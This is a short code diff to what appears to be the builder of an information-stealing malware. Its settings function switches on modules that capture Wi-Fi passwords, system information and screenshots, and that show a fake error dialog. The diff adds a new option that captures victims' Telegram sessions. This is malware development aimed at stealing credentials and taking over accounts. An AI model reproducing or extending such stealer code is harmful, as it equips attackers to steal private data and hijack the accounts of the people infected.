@@ -29,6 +29,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
     code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
     code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")
+    code = code.replace('%capturetelegram%', "true" if settings["modules"]["captureTelegramSession"] else "")
 
     code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
     code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
